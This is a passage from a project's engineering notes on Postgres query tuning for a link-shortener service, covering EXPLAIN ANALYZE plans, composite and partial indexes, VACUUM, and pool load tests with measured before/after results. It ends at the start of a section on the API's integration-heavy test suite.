  as a row-by-row filter. Cost is linear in table size, independent of
  selectivity. The cleanup sweep's `before.md` plan.
- **Index Scan** — walks the B-tree to find matching entries, then fetches
  each matching row from the table heap to get any column not in the
  index. The redirect lookup (`links_short_code_key`) throughout.
- **Index Only Scan** — like an Index Scan, but every column the query
  needs is already in the index itself, so the heap fetch is skipped
  entirely (`Heap Fetches: 0` in the plan). `after.md`'s bounded click
  aggregation query — `clicks_link_id_clicked_at_index` covers `link_id`,
  `clicked_at`, and (for a `count(*)`) needs nothing else from the row.

Reading a captured plan is done inside-out — the innermost node runs
first, and its output feeds the node above it. Take `after.md`'s link-list
plan:

```
Limit  (cost=0.41..50.88 rows=20 width=105) (actual time=0.041..0.059 rows=20 loops=1)
  ->  Index Scan using links_user_id_created_at_id_index on links (...)
        Index Cond: (user_id = '...'::uuid)
```

Read from the bottom: the `Index Scan` walks
`links_user_id_created_at_id_index` filtering on `user_id`, in the order
the index stores rows (`created_at DESC, id DESC` — matching the query's
`ORDER BY`); the `Limit` above it stops pulling rows from that scan the
moment 20 have been produced. `cost=X..Y` is the planner's own estimate in
arbitrary units (startup cost, then total cost, not milliseconds) used to
compare candidate plans against each other before execution; `rows` next
to it is the estimated row count. `actual time=X..Y` and the `rows=`/
`loops=` on the same line are what really happened — this is the entire
point of `ANALYZE` in `EXPLAIN ANALYZE`: it executes the query for real
and reports ground truth alongside the estimate, rather than just printing
the plan the optimizer intends to use. `loops=1` means this node ran once;
a nested loop's inner side can show `loops > 1` (once per outer row), and
`actual time` there is reported *per loop*, not summed — a detail worth
knowing before reading `loops=1058` and multiplying wrong. `BUFFERS`
(added explicitly via `EXPLAIN (ANALYZE, BUFFERS)`, not the default)
reports `shared hit` (served from Postgres's buffer cache — no disk
touched) versus `shared read` (a real page read) — the difference between
a warm cache and genuine I/O, which raw timing alone can't distinguish.

**Where it lives in the codebase.** `docs/performance/before.md` and
`after.md` — every plan in this phase is captured this way, not
paraphrased.

**Common pitfalls.**

- Reading `cost` as if it were milliseconds — it's the planner's own
  internal, unitless estimate, comparable to other costs in the same plan
  but not to a wall-clock number.
- Trusting `EXPLAIN` without `ANALYZE` for anything beyond "what plan would
  the planner pick" — without `ANALYZE`, nothing actually executes, so
  there's no `actual time`/`rows`/`loops` to check the estimate against.
- Running `EXPLAIN ANALYZE` on a write query (`UPDATE`/`DELETE`) without
  wrapping it in a transaction you intend to roll back — it executes the
  write for real. `before.md`'s cleanup-sweep capture uses `BEGIN; EXPLAIN
  (ANALYZE, BUFFERS) UPDATE ...; ROLLBACK;` for exactly this reason (a
  naive `AND false` guard was tried first and rejected — Postgres
  constant-folds it into a zero-cost no-op plan that never touches the
  real predicate at all, defeating the measurement).

**Production considerations.** `EXPLAIN ANALYZE` against a local, possibly
cold-cache database isn't identical to production behavior under
concurrent load and a warm cache — it's the right tool for "does this
index get chosen and does it change the plan shape," not a promise that
the millisecond numbers transfer unchanged to production traffic.

**Interview answer.** I read a plan inside-out: the innermost node
executes first and feeds the ones above it. The two numbers that matter
most are the scan type (`Seq Scan` means linear cost regardless of
selectivity; `Index Scan`/`Index Only Scan` means logarithmic lookup plus,
for the "Only" variant, no heap access at all) and whether `actual rows`
roughly matches `estimated rows` — a big gap there means the planner's
statistics are stale or can't capture some correlation in the data, which
is itself diagnostic information, not just a curiosity.

### Why the seed data is non-uniform, on purpose

**What it is. `scripts/seed-bulk.ts` assigns clicks to links using a
Zipf-law distribution (`weight ∝ 1/rank`), not an even split — the seeded
data has one link with 45,728 clicks and an average link with about 10.

**Why it exists in this project.** A uniform seed would have actively
hidden the problem this phase exists to fix. If every link got the same
~10 clicks, `WHERE link_id = $1` on `clicks` would return roughly the same
tiny row count for every link, and there would be no case where a `Seq
Scan` on `clicks` is visibly expensive for one link and trivially cheap
for another — the exact contrast that makes a captured `EXPLAIN ANALYZE`
plan meaningful evidence instead of noise. Real click distributions are
skewed for the same underlying reason city populations, word frequencies,
and viral content all follow power laws: a small number of items capture
disproportionate attention. Seeding uniformly wouldn't just be
unrealistic, it would specifically launder away the one property
(skew) that makes measuring an index's benefit on a genuinely hot link
possible at all.

**How it works mechanically.** Each of the 50,000 links gets a shuffled
rank `1..50,000` (shuffled so "hottest" isn't correlated with insertion
order or which user owns it); `weight(rank) = (1/rank) / H` where `H` is
the harmonic sum `Σ 1/k` for `k = 1..50,000`; expected clicks for a rank is
`totalClicks × weight(rank)`, with ±30% uniform jitter applied before
rounding so the curve isn't a perfectly deterministic staircase. At
`totalClicks = 500,000`, rank 1 lands around 43,800 clicks, rank 100
around 440, rank 10,000 around 4 — the seeded run actually produced a
hottest link at 45,728 against an average of 9.88, a ratio of roughly
4,600:1.

**Where it lives in the codebase.** `scripts/seed-bulk.ts`,
`assignClickCounts`/`zipfWeights`.

**Common pitfalls.**

- Seeding "enough rows" and assuming volume alone makes a benchmark
  realistic — row *count* and row *distribution* are different axes, and
  this phase's methodology depends on the second one specifically.
- Treating the ±30% jitter as if it were statistically rigorous
  (true Poisson variance around each rank's expectation) — it isn't, and
  doesn't need to be. The goal is the right qualitative shape (a few very
  hot links, a long cold tail), not a publishable model of click
  popularity.

**Production considerations.** Real production click distributions may be
skewed by a different exponent, or bursty in time rather than only in
per-link total (a single link going viral within one hour looks different
from the same total spread evenly over a year) — this seed captures the
first kind of realism (per-link skew) but not the second (temporal
burstiness), which is named as an open question in
`docs/performance/README.md`'s "what to investigate next."

**Interview answer.** I seeded a Zipf distribution instead of an even
split because uniform test data would have hidden the exact thing I
needed to measure. If every link had the same click count, there'd be no
link where a full scan is obviously expensive versus one where it's
obviously cheap — and that contrast is what makes an `EXPLAIN ANALYZE`
plan meaningful evidence for an index decision rather than an arbitrary
number. Real click data is skewed for the same structural reason most
popularity data is (a small number of items capture most of the volume),
so a skewed seed isn't just more rigorous, it's closer to what production
will actually look like.

### Composite indexes, column order, and the leftmost-prefix rule

**What it is.** A composite (multi-column) index stores rows sorted by
its first column, then by its second column within ties on the first,
and so on — `links_user_id_created_at_id_index` is `(user_id, created_at
DESC, id DESC)`. The leftmost-prefix rule follows directly from that
storage order: the index can serve any query whose filter/sort conditions
form a *prefix* of the column list, but not one that skips a leading
column.

**Why it exists in this project.** `listLinks`'s rows query
(`linkService.ts`) is `WHERE user_id = $1 ORDER BY created_at DESC, id
DESC` — a single-column index on `user_id` alone can find the matching
rows efficiently, but can't also hand them back pre-sorted, since it only
knows *which* rows match, not what order they should come out in for this
particular `ORDER BY`. `before.md`'s plan shows exactly that gap: a
`Bitmap Index Scan` on the old `links_user_id_index` finds the 1,058
matching rows, then a `Sort` node above it re-orders them before the
`LIMIT 20` can apply.

**How it works mechanically.** `user_id` is leftmost because it's the
query's *equality* predicate — that's what the leftmost-prefix rule
requires for the other columns to be useful at all: once the index has
narrowed down to rows with a specific `user_id`, the remaining entries for
that user are stored in `created_at DESC, id DESC` order, which now
exactly matches the query's `ORDER BY`. `after.md`'s plan confirms it: a
single `Index Scan` (no `Bitmap`, no separate `Sort`) walks the index in
that pre-sorted order and stops as soon as 20 rows have been produced —
`~5.4x` faster (0.391ms → 0.072ms) purely from eliminating the sort step.
`id DESC` as the third key isn't decorative: `created_at` alone can't
break ties between two links created in the same instant, so without `id`
as an explicit tiebreaker the sort couldn't be fully eliminated for rows
sharing a `created_at` value.

What this index *can't* serve: any query whose equality/range predicate
isn't `user_id` (a bare `WHERE created_at > $1` across all users, for
instance, gets no help from this index at all — `created_at` isn't
leftmost), and any `ORDER BY` on `user_id`'s matching rows that isn't
`created_at DESC, id DESC` specifically (ascending order, or ordering by a
different column, would need the index scanned backwards or not at all,
depending on the specific mismatch).

**Where it lives in the codebase.** `migrations/
20260818173151020_add-performance-indexes.ts`
(`links_user_id_created_at_id_index`); served query in
`src/services/linkService.ts`, `listLinks`.

**Common pitfalls.**

- Putting the "most important" or highest-cardinality column first out of
  habit, rather than the column your actual query's equality predicate
  filters on — cardinality matters for how selective an index *is*, but
  the leftmost-prefix rule is about which queries can *use* it at all.
- Assuming a composite index automatically also serves a query with no
  filter on the leftmost column — it doesn't; the leftmost-prefix rule is
  a hard requirement, not a soft preference.

**Production considerations.** Every additional column in a composite
index widens each index entry, meaning more disk/cache space and slightly
more write-maintenance cost per row than a narrower index — the third
column (`id`) here earns its keep only because the query's `ORDER BY`
genuinely needs a tiebreaker; an index doesn't get a third column "for
completeness."

**Interview answer.** Column order in a composite index isn't a style
choice, it's mechanical: the index is physically sorted by the first
column, then the second within ties on the first, and so on, so it can
only serve a query whose conditions form a prefix of that column list —
the leftmost-prefix rule. I put `user_id` first because it's the query's
equality filter; `created_at DESC, id DESC` after it because that's
exactly the query's `ORDER BY`, letting Postgres return pre-sorted rows
straight off the index instead of fetching everything that matches and
sorting it afterward. I confirmed this wasn't just theoretical by
capturing the before and after plans — the `Sort` node that existed before
this index is gone after, and that's a direct, visible consequence of
matching the index's trailing columns to the query's `ORDER BY`, not an
assumption.

### Partial indexes and when they win

**What it is.** A partial index only includes rows matching a `WHERE`
clause specified at index-creation time —
`links_expires_at_active_partial_index` is `ON links (expires_at) WHERE
is_active = true`, so a row with `is_active = false` isn't in this index
at all, regardless of its `expires_at` value.

**Why it exists in this project.** The cleanup sweep's predicate is
`WHERE is_active = true AND expires_at IS NOT NULL AND expires_at <=
now()`. `is_active` alone is a poor index candidate: it's a boolean with
low selectivity — at any given moment, the overwhelming majority of links
are active, so an index whose leftmost column is a value shared by most of
the table gives the planner little reason to prefer it over a `Seq Scan`
(and `before.md`'s methodology explicitly rejected a standalone
`is_active` index for exactly this reason — see "Indexes considered and
rejected" below). What actually makes this predicate selective is
`expires_at <= now()` — but only among rows that are still active in the
first place. A partial index keyed on `expires_at`, scoped to `WHERE
is_active = true`, captures exactly that: selective on the column that's
actually selective, restricted to the subset the query cares about.

**How it works mechanically.** `before.md` shows the cost of not having
this: a `Seq Scan` visiting all 50,000 seeded links, filtering row by row,
with `Rows Removed by Filter: 48,559` against only 1,441 real matches —
97% wasted work, explicitly visible in the plan. `after.md` shows a
`Bitmap Index Scan` on the partial index instead, touching only the
matching rows. The partial index also self-maintains its own relevance:
the moment the sweep flips a row's `is_active` to `false`, that row drops
out of the index on its very next update — the index's size tracks the
"currently active" population, not the whole table, so it doesn't grow
unboundedly as inactive rows accumulate over the table's lifetime the way
a full index would.

**Where it lives in the codebase.** `migrations/
20260818173151020_add-performance-indexes.ts`
(`links_expires_at_active_partial_index`); served query in `worker/
processors/linkCleanupProcessor.ts`, `sweepExpiredLinks`.

**Common pitfalls.**

- Indexing a low-selectivity boolean column directly, expecting it to help
  — the planner will often just ignore it in favor of a `Seq Scan`, since
  "most rows match" makes an index lookup no cheaper than reading the
  table.
- Forgetting that a partial index's `WHERE` clause must be a *subset* of
  (or logically imply) the query's `WHERE` clause for the planner to
  consider it at all — an index partial on `is_active = true` can't serve
  a query filtering on `is_active = false`.

**Production considerations.** If the active/inactive ratio in production
ever inverts (most links expired and swept, few still active), this
partial index would become the small, efficient one and a hypothetical
full index would have been the wasteful one — the win here isn't fixed at
migration time, it tracks whatever the real active/inactive split turns
out to be.

**Interview answer.** A partial index only stores entries for rows
matching a `WHERE` clause set at creation time. I used one here because
the sweep's predicate has two parts with very different selectivity:
`is_active = true` matches almost everything (a bad index key on its
own), while `expires_at <= now()` is genuinely selective — but only
within the active subset. A partial index scoped to `is_active = true`
and keyed on `expires_at` gets both properties: it's small (only active
rows), and its key column is actually discriminating within that scope. I
verified this wasn't guesswork by measuring — the before plan was a `Seq
Scan` visiting 50,000 rows to find 1,441 matches; after, a `Bitmap Index
Scan` visiting only the matches.

### ANALYZE, VACUUM, and planner statistics — two separate prerequisites

**What it is.** `ANALYZE` samples a table's rows and updates the
planner's statistics (row counts, most-common values, column
correlations) — the numbers `EXPLAIN`'s cost estimates are computed from.
`VACUUM` is a different operation entirely: among other things, it
updates a table's *visibility map*, which tracks which pages contain only
rows visible to every transaction. Both matter for index performance, for
different reasons, and conflating them was a real mistake caught during
this phase's own measurement.

**Why it exists in this project.** `scripts/seed-bulk.ts` bulk-loads
~550,000 rows in a handful of large batched `INSERT`s, then calls
`ANALYZE users, links, clicks` before finishing — without it, the planner
would still be working off whatever statistics existed before the load
(for a freshly migrated table, essentially none), and `before.md`'s
captured plans would depend on unpredictable autovacuum timing rather than
being reproducible. That much was anticipated. What wasn't anticipated
until the actual after-migration measurement: right after creating the
three new indexes and running `ANALYZE`, the link-list *count* query's
plan came back as a `Bitmap Heap Scan` instead of the expected `Index Only
Scan` — even though the new composite index covers every column that
query needs.

**How it works mechanically.** An `Index Only Scan` can skip visiting the
table heap entirely, but only for pages the visibility map marks
"all-visible" (every row on that page is visible to every transaction, so
there's no need to double-check row visibility against the heap).
`ANALYZE` refreshes row-count/value statistics; it does **not** touch the
visibility map. A freshly created index sits on a table whose visibility
map was last updated before that index existed, so Postgres has no basis
for trusting an index-only path yet and falls back to a `Bitmap Heap
Scan`, checking the heap per row. Running `VACUUM users, links, clicks`
immediately fixed it — the same query plan flipped straight to the
expected `Index Only Scan` with `Heap Fetches: 0`, and execution time
dropped back in line with the pre-migration baseline (0.250ms → 0.129ms,
matching `before.md`'s 0.135ms). In production, autovacuum eventually
does this automatically — but "eventually" is doing real work in that
sentence, and it isn't instant.

**Where it lives in the codebase.** `scripts/seed-bulk.ts`'s `ANALYZE`
call; the explicit `VACUUM users, links, clicks;` step documented in
`docs/performance/after.md`, run once after the new migration, before
capturing any post-migration plan.

**Common pitfalls.**

- Assuming `ANALYZE` is the only planner-facing maintenance operation that
  matters — this phase's own measurement is the counter-example.
  `ANALYZE` and `VACUUM` are separate operations that happen to often run
  together (`VACUUM ANALYZE` is common exactly because they're
  complementary, not because they're the same thing).
- Capturing a "before/after" comparison immediately after creating a new
  index without accounting for this — a naive after-plan captured right
  after `CREATE INDEX` (no `VACUUM`) would have made this index look worse
  than it actually is, a measurement artifact rather than a real property
  of the index.

**Production considerations.** Autovacuum handles this automatically on a
schedule driven by table modification thresholds — but a burst of bulk
writes (a data migration, a large import) can outrun it, leaving newly
built or newly relevant indexes in this same "not yet index-only-eligible"
state for longer than expected. A manual `VACUUM` after a large bulk
operation is a reasonable, low-risk way to close that gap deliberately
rather than waiting on autovacuum's own timing.

**Interview answer.** I ran into a real example of this while measuring
Phase 11: right after creating a new composite index and running
`ANALYZE`, one query's plan wasn't using an `Index Only Scan` even though
the index covered every column it needed. The reason is that `ANALYZE`
updates row-count and value statistics, but the ability to skip the heap
entirely in an `Index Only Scan` depends on the visibility map, which only
`VACUUM` updates — a freshly built index sits on a table whose visibility
map predates it. Running `VACUUM` fixed it immediately. It's a good
example of why I measure rather than assume: I expected `ANALYZE` alone
to be sufficient, and the captured plan told me otherwise.

### Estimated vs. actual row divergence as a diagnostic signal

**What it is.** Every `EXPLAIN ANALYZE` node reports both an estimated row
count (what the planner predicted, used to choose the plan) and an actual
row count (what really came back). A large gap between them is a signal
that the planner's statistics don't reflect reality well for that specific
predicate — even when it doesn't change which plan gets chosen.

**Why it exists in this project.** `before.md`'s cleanup-sweep plan
estimated 289 matching rows for `WHERE is_active = true AND expires_at IS
NOT NULL AND expires_at <= now()`; the real count was 1,441 — roughly 5x
higher. This is flagged explicitly in `before.md` rather than glossed
over, because it's informative independent of the indexing decision
itself.

**How it works mechanically.** Postgres's planner estimates a compound
`AND` predicate's selectivity by treating each condition's selectivity as
independent and multiplying them together, unless it has multivariate
statistics telling it otherwise (extended statistics, not configured
here). `is_active = true` and `expires_at <= now()` aren't actually
independent in this data — links that are still active and links that are
past their expiry date correlate (an old, still-active link is more likely
to be one nobody has gotten around to expiring), so the independence
assumption underestimates how many rows satisfy both conditions together.
That's exactly the kind of correlation column-level statistics can't
capture.

**Where it lives in the codebase.** `docs/performance/before.md`, the
cleanup-sweep section's "flagged estimate/actual divergence" note.

**Common pitfalls.**

- Treating a plan with a good (low) cost estimate as automatically fast —
  the estimate is only as good as the statistics it's built from; a
  confidently-wrong estimate can still choose a plan that does far more
  work than expected.
- Ignoring divergence because "the query was fast anyway" — at this
  phase's data volume, a 5x miss on 1,441 rows out of 50,000 didn't change
  which plan won. At a different scale, or with a less selective index
  available, the same kind of miss could push the planner toward a worse
  plan than the divergence-free estimate would have chosen.

**Production considerations.** If this specific correlation strengthens
over time in production (a growing gap between "expired" and "expired and
swept," if the sweep ever falls behind), the divergence would grow with
it — worth revisiting if sweep behavior or table composition changes
materially from what this phase measured.

**Interview answer.** Estimated-vs-actual divergence is one of the first
things I check in an `EXPLAIN ANALYZE` plan, because it tells you whether
to trust the plan's own reasoning. In this phase, the cleanup sweep's plan
estimated 289 matching rows and actually found 1,441 — about 5x off. The
cause is that Postgres estimates compound `AND` conditions assuming
independence between columns unless told otherwise, and here `is_active`
and `expires_at` are correlated in the real data. It didn't change which
plan won in this case, but a bad estimate is a leading indicator: at a
different scale, or with different indexes available, the same kind of
miss can push the planner toward a genuinely worse plan than a correct
estimate would have chosen.

### What indexes cost: write amplification, storage, and planner complexity

**What it is.** Every index on a table is additional work on every
`INSERT`/`UPDATE`/`DELETE` that touches an indexed column — the index's
own B-tree has to be kept correct, not just the table's heap. This is the
cost side of the index/query tradeoff this whole phase has been arguing
the benefit side of.

**Why it exists in this project.** The click-insert path
(`worker/processors/clickProcessor.ts`) runs on every single redirect that
gets processed — it's the highest-frequency write in the system, and it's
exactly the table (`clicks`) that gained a new composite index this phase.
If that index's write cost were significant, it would be the one place in
this phase where the tradeoff could plausibly not be worth it.

**How it works mechanically.** A `processClickJob` micro-benchmark (1,000
transactions, mixed hot/cold links, `worker/db/pool.ts`'s own connection,
measured via `process.hrtime.bigint()`) was run before and after the
migration:

```
Before: p50=0.647ms  p95=0.896ms  mean=0.719ms  max=9.974ms
After:  p50=0.654ms  p95=0.836ms  mean=0.693ms  max=2.971ms
```

The honest result is **no measurable regression at this scale** — p50 is
0.007ms higher (within run-to-run noise), p95 and mean are both slightly
*lower*, and the max dropped substantially (almost certainly an unrelated
outlier in the "before" run, not a systematic effect). The write cost of
one more B-tree insert per row is real in principle — an index isn't
free — but at ~494,000 rows and a 1,000-transaction sample, it's too
small to distinguish from ordinary variance. This is the honest
conclusion, not "indexes are free": a much larger table, or a benchmark
built to average out noise across many more repetitions, would be needed
to actually isolate that marginal cost.

**Where it lives in the codebase.** `scripts/bench/clickWriteBench.ts`;
results in `docs/performance/after.md`'s "Write-path benchmark" section.

**Common pitfalls.**

- Assuming "no measurable regression" means "no cost" — it means the cost
  wasn't distinguishable from noise *at this specific scale and sample
  size*, which is a narrower and more honest claim.
- Skipping the write-cost measurement entirely because the read-side win
  is large and "obviously worth it" — the whole point of a measurement-
  driven methodology is not skipping the half of the tradeoff that's less
  exciting to report.

**Production considerations.** Storage cost also scales with row count
and index width — a composite index on a two-column key
(`link_id, clicked_at`) is wider per entry than a single-column one, and
that difference compounds across hundreds of millions of rows in a way it
doesn't at hundreds of thousands. Worth re-measuring storage and write
cost specifically if `clicks` grows an order of magnitude or more.

**Interview answer.** I measured the write-side cost, not just assumed
it. Every index adds maintenance work on writes — indexes aren't free —
so I ran the same click-insert benchmark before and after adding the new
composite index on `clicks`. The honest result was no measurable
regression at this data volume: the numbers moved within normal
run-to-run noise, not a clear direction. I'm careful not to oversell that
as "this index has no cost" — it has a real cost in principle, it's just
too small to isolate from noise at ~494,000 rows and a 1,000-transaction
sample. A responsible answer names the limits of what was actually
measured, not just the headline number.

### Indexes considered and rejected

**What it is.** Three index ideas that came up during this phase's design
and were explicitly turned down, with reasons — as load-bearing to this
phase's methodology as the indexes that were added.

**Why it exists in this project.** "No speculative indexes" cuts both
ways: it means not adding an index without evidence, and it means writing
down what was considered and declined so a future contributor doesn't
re-propose the same idea without knowing it was already evaluated.

**How it works mechanically.**

- **`clicks.clicked_at` alone, non-composite.** No query in this codebase
  filters or sorts by `clicked_at` without filtering by `link_id` first —
  the click-aggregation endpoint is always scoped to one link. An index
  whose leftmost column nothing queries by in isolation gets essentially
  zero planner use while still paying full write-time maintenance cost on
  every click insert.
- **`links.is_active` alone, full (non-partial).** Covered above under
  partial indexes — a standalone index on a low-selectivity boolean rarely
  earns its cost over a `Seq Scan`, which is exactly why the actual fix
  was a partial index keyed on the genuinely selective column instead.
- **`INCLUDE`/covering columns** on any of the three new indexes (e.g.
  adding `destination_url` to the list-links composite to make it fully
  index-only). No query in this phase's measurements was proven to need
  it — none of the captured plans showed a heap-fetch cost large enough to
  justify the extra index width. This is exactly the "might help later"
  reasoning this whole phase's methodology exists to avoid; if a future
  measurement shows a heap fetch that's actually expensive, that's the
  evidence needed to revisit, not before.

**Where it lives in the codebase.** `migrations/
20260818173151020_add-performance-indexes.ts`'s own comments;
`docs/performance/README.md`'s "Rejected" section.

**Common pitfalls.**

- Only documenting what was built, not what was considered and declined —
  the rejected list is what stops the same speculative index from getting
  re-proposed and re-added without anyone remembering it was already
  evaluated and found unnecessary.

**Production considerations.** Any of these three could become justified
later under different evidence — a future `clicked_at`-only query pattern,
a shift in the active/inactive ratio, or a proven index-only-scan need —
at which point the right move is the same one this whole phase modeled:
capture a plan, then decide.

**Interview answer.** I keep a "rejected" list, not just an "added" list.
For this phase that's three indexes: a standalone `clicked_at` index
(nothing queries it without `link_id` first), a standalone `is_active`
index (too low-selectivity to beat a sequential scan — the partial index
on `expires_at` was the actual fix), and `INCLUDE` columns on any of the
three new indexes (no measured query needed them). Writing down what was
considered and declined, with the reason, matters as much as writing down
what got added — it's what stops the same speculative index from getting
re-proposed later by someone who doesn't know it was already evaluated.

### N+1 queries

**What it is.** An N+1 query pattern is one query to fetch a list of `N`
items, followed by `N` more queries — one per item — to fetch related
data for each, where a single query (a `JOIN`, or a batched `WHERE id =
ANY($1)`) could have done the same job in two queries total regardless of
`N`. ORMs make this easy to write by accident: lazy-loading a relationship
inside a loop looks identical to accessing an already-fetched field, so
the extra round trip is invisible at the call site.

**Why it exists in this project.** Confirming its absence is itself part
of this phase's audit — a query-per-request-not-per-row discipline that's
easy to erode silently as new features get added, so it's worth checking
explicitly rather than assuming.

**How it works mechanically.** This codebase doesn't use an ORM (raw
parameterized SQL via `src/db/pool.ts`'s `query()` throughout), which
removes the specific mechanism (transparent lazy-loading) that makes N+1
easy to write without noticing — every query here is a query you can see
directly in the code. A search across every loop construct (`for`,
`for...of`, `forEach`, `.map`) in `src/` and `worker/` found exactly two
categories: a bounded short-code-collision retry (`linkService.ts`, at
most `MAX_GENERATION_ATTEMPTS` = 5 single-row `INSERT` attempts — a
bounded retry on one logical write, not a fan-out over a result set), and
in-memory `.map()` transforms of rows already fetched by a prior single
query (`rowsResult.rows.map(toLink)` and similar). No loop issues a query
per iteration over a previously-fetched collection.

**Where it lives in the codebase.** Confirmed absent across `src/` and
`worker/` — see `docs/performance/README.md`'s "N+1 audit" section for the
specific search performed.

**Common pitfalls.**

- Assuming "we don't use an ORM" is itself a guarantee against N+1 — it
  removes the most common *mechanism*, not the possibility; hand-written
  code can still loop-and-query if nobody's watching for it.
- Only checking the obvious data-fetching loops and missing one inside a
  helper function several calls removed from the route handler — an N+1
  audit needs to follow the actual call graph, not just the top-level
  route code.

**Production considerations.** Worth re-running this same audit whenever a
new feature adds a loop that touches related data — the absence confirmed
here is a snapshot of the current codebase, not a permanent guarantee.

**Interview answer.** An N+1 is one query for a list plus one query per
item for that item's related data, where a single `JOIN` or batched query
could replace all `N` of the extra ones — ORMs make this easy to write
accidentally because lazy-loading a relationship inside a loop looks
identical to reading an already-fetched field. I audited this codebase by
searching every loop construct across the API and worker code and traced
each one — the only loops that exist are a bounded retry on a single
logical write and in-memory transforms of data already fetched by one
query. I'm reporting a confirmed absence, not assuming one, because
"we don't use an ORM" reduces the risk but doesn't eliminate it by itself.

### Connection pool sizing from evidence

**What it is.** Both the API (`src/db/pool.ts`) and the worker (`worker/
db/pool.ts`) run their own `pg.Pool` at `max: 10`. This phase's job was to
find out whether that number is actually justified at the data volume and
concurrency this system now has real measurements for, rather than
picking a new number by feel.

**Why it exists in this project.** "500 concurrent users sounds like it
needs more than 10 connections" is exactly the kind of intuition this
project's whole methodology exists to replace with a measurement.
`pg.Pool` exposes `waitingCount`/`idleCount`/`totalCount` as live
properties specifically for this — a burst of concurrent requests against
a small pool will show up as a nonzero `waitingCount`, which is the actual
undersizing signal, not a felt sense that the number is too low.

**How it works mechanically.** A load-test script
(`scripts/bench/poolLoadTest.ts`) fired 500 concurrent `listLinks` calls
(1,000 actual queries — `listLinks` issues two per call) against 500
distinct real seeded users, sampling `pool.waitingCount` every event-loop
tick for the duration of the burst:

```
Run 1: 83.67ms total, peak waitingCount 1,001
Run 2: 81.66ms total, peak waitingCount 1,001
Run 3: 81.89ms total, peak waitingCount 1,001
```

Real queueing does happen — `waitingCount` peaks at 1,001 the instant the
burst is dispatched, confirming `max: 10` is genuinely the bottleneck for
a true all-at-once burst of this size. But the entire 1,000-query backlog
still drains in ~82ms, because each individual query is sub-millisecond
(the same queries measured throughout this phase) — a 10-connection pool
churns through that backlog fast enough that the queueing, while real, has
no user-visible consequence at this volume. The worker pool showed the
same shape under a 200-job burst of `processClickJob` (40x its configured
concurrency of 5): peak `waitingCount` 201, drained in ~71ms.
`pg_stat_activity` snapshots taken mid-run, in both cases, showed no
connections stuck in `idle in transaction` — the specific pathology
`withTransaction`'s try/finally is designed to prevent.

**Where it lives in the codebase.**
`scripts/bench/poolLoadTest.ts`, `scripts/bench/workerPoolLoadTest.ts`;
results in `docs/performance/README.md`'s "Connection pool review".

**Common pitfalls.**

- Treating a synthetic all-at-once burst as equivalent to real traffic —
  500 requests landing in the same event-loop tick is a deliberately
  adversarial pattern meant to find a ceiling, not a simulation of how
  requests actually arrive (spread over wall-clock time) in production.
- Concluding "queueing occurred, therefore the pool is too small" without
  also checking whether the queue actually caused a user-visible delay —
  both are real findings here, and they point in different directions
  (yes to the first, no to the second, at this scale).

**Production considerations.** The right trigger for revisiting `max: 10`
is *sustained* (not momentary-burst) `waitingCount > 0` in real traffic,
or `idle in transaction` connections that don't clear — neither showed up
in this phase's measurements, which is itself the finding: no change
justified *yet*, backed by actual sampled data rather than an assumption
that a low number must be fine.

**Interview answer.** I didn't re-guess the pool size, I measured it. I
fired 500 concurrent requests at a pool sized for 10 connections and
sampled `pool.waitingCount` throughout — real queueing showed up
immediately (it peaked at over 1,000 pending connection requests), which
confirms the pool genuinely is the bottleneck under that burst. But the
whole backlog still drained in about 80 milliseconds, because the
underlying queries are sub-millisecond each — so the queueing is real but
has no user-visible cost at this data volume and this burst pattern. My
conclusion was "no change justified yet," and I made sure that was a
measured conclusion with real numbers behind it, not a guess dressed up as
one — an unmeasured "it's probably fine" isn't something I'm willing to
report as a finding.

### Results

Full before/after `EXPLAIN ANALYZE` plans: `docs/performance/before.md`,
`docs/performance/after.md`. Summary:

| Query | Before | After | Delta |
|---|---|---|---|
| Redirect lookup | 0.135 ms | 0.062 ms | not a target — already indexed |
| Link list rows | 0.391 ms (Sort + scan) | 0.072 ms (no Sort) | ~5.4x faster |
| Link list count | 0.135 ms | 0.129 ms | unchanged — no `ORDER BY` to serve |
| Cleanup sweep | 24.478 ms (Seq Scan) | 14.123 ms (Bitmap Index Scan) | ~1.7x faster |
| Click aggregation (30d) | 8.457 ms | 2.868 ms | ~2.9x faster |
| Click aggregation (unbounded) | 16.091 ms | 14.369 ms | only ~11% — see `after.md` |
| Write path (click insert, mean) | 0.719 ms | 0.693 ms | no measurable regression |

The cleanup sweep was the single largest win, and also the query with the
worst estimated/actual row divergence (5x) beforehand — both facts about
the same query, not a coincidence: a `Seq Scan` doesn't care how wrong the
row estimate is, it does the same linear amount of work regardless, which
is exactly what made it the most expensive plan in this set to begin with.

## Phase 13a: Testing the API

### The testing pyramid, inverted, and why that's correct here

**What it is.** The classic testing pyramid says: many fast unit tests at
the base, fewer integration tests in the middle, a handful of end-to-end
tests at the top. This suite is shaped the other way — of 25 files and 242
tests, only `tests/lib/shortCode.test.ts` and most of `tests/config/env.test.ts`
are pure unit tests with no I/O; nearly everything else runs supertest
against the real Express app, backed by a real Postgres database
(`clickscope_test`) and a real local Redis instance.

**Why it exists in this project.** The pyramid's shape is a proxy for a
cost tradeoff — unit tests are cheap and fast, so lean on them, and reserve
expensive integration tests for what only shows up at the seams. But that
tradeoff assumes the interesting bugs live in isolated logic. In this API,
they don't. Every one of the 8 mutations exercised in this phase lived
*at* a seam: a SQL WHERE clause's interaction with Postgres's bind-
parameter protocol (mutation 1/2), a route's interaction with Express's
`res.redirect` (mutation 3), an INSERT's interaction with a UNIQUE
constraint (mutation 4), a function's interaction with wall-clock time
(mutation 5), a service's interaction with Redis (mutation 6), a library's
actual hashing behavior (mutation 7), a handler's interaction with request
ordering (mutation 8). A unit test that mocks the database or Redis to
isolate `deleteLink`'s "logic" would have to also mock away the exact
mechanism — the `AND user_id = $2` clause talking to a real query planner
— that mutation 1 broke. Mocking the seam out is mocking the bug out.
Given that, this suite's near-total commitment to integration tests isn't
a smell; it's the pyramid inverted on purpose because the thing being
built is thin business logic wrapped around three real systems (Postgres,
Redis, BullMQ), and the real systems are where the risk actually lives.

**How it works mechanically.** `tests/globalSetup.ts` provisions a
dedicated `clickscope_test` database and runs every migration once before
the suite starts, so `npm test` is self-contained for a new contributor.
`vitest.config.ts` sets `fileParallelism: false` because most files share
that one Postgres instance and one Redis instance rather than each getting
an isolated sandbox — cheaper to set up than one throwaway database per
file, at the cost of requiring serial execution and, as this phase found,
occasional cross-file interaction (see "Test isolation" below).

**Where it lives in the codebase.** `tests/routes/*.test.ts` and
`tests/services/*.test.ts` are the bulk of it; `tests/db/*.test.ts` tests
the schema itself (constraints, migrations, index usage) directly against
Postgres with no application code in between.

